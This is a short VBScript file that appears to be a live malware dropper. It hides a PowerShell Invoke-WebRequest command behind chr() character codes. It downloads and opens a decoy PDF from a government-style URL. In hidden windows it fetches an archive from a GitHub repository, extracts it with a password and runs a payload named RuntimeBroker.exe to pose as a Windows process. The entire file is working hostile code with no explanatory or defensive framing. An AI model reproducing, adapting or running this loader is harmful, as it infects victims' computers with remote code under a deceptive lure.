Dim fldr, shl, psCmd1p1, psCmd1p2, psCmd1p3, psCmd1p4

fldr = "C:\dados"

psCmd1p1 = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+" -Command "+chr(34)+chr(73)+chr(110)+chr(118)+chr(111)+chr(107)+chr(101)+chr(45)+chr(87)+chr(101)+chr(98)+chr(82)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)
psCmd1p3 = chr(45)+chr(79)+chr(117)+chr(116)+chr(70)+chr(105)+chr(108)+chr(101)

Set shl = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If fso.FileExists(fldr+"\lock.bin") Then
	WScript.Quit
End If

shl.Run "cmd /c echo AAA > C:\dados\lock.bin", 0
WScript.Sleep 250

If fso.FileExists(fldr+"\file.pdf") = False Then
	psCmd1p2 = " https://mid-educacao.curitiba.pr.gov.br/2024/12/pdf/00507527.pdf "
	psCmd1p4 = " "+fldr+"\file.pdf;cmd /c echo AAA > "+fldr+"\pdfok.bin"+chr(34)
	
	shl.Run psCmd1p1+psCmd1p2+psCmd1p3+psCmd1p4, 0
	
	Do While fso.FileExists(fldr+"\pdfok.bin") = False
		WScript.Sleep 250
	Loop
End If

shl.Run fldr+"\file.pdf", 1


If fso.FileExists(fldr+"\comp.exe") = False Then
	psCmd1p2 = " https://github.com/wubbalubbatuamaenumasuruba-cloud/r1/raw/refs/heads/main/comp.dat "
	psCmd1p4 = " "+fldr+"\comp.exe;cmd /c echo AAA > "+fldr+"\compok.bin"+chr(34)
	
	shl.Run psCmd1p1+psCmd1p2+psCmd1p3+psCmd1p4, 0
	
	Do While fso.FileExists(fldr+"\compok.bin") = False
		WScript.Sleep 250
	Loop
End If

If fso.FileExists(fldr+"\RuntimeBroker.exe") = False Then
	psCmd1p1 = fldr+"\comp.exe"
	psCmd1p2 = " -pPMC2025 -y"
	
	shl.Run psCmd1p1+psCmd1p2, 0
End If

If fso.FileExists(fldr+"\lockfin.bin") = False Then
	WScript.Sleep 60000 '1min
	shl.Run "cmd /c echo AAA > C:\dados\lockfin.bin", 0
	psCmd1p1 = fldr+"\RuntimeBroker.exe"
	shl.Run psCmd1p1, 0
End If

fso.DeleteFile(fldr+"\lock.bin")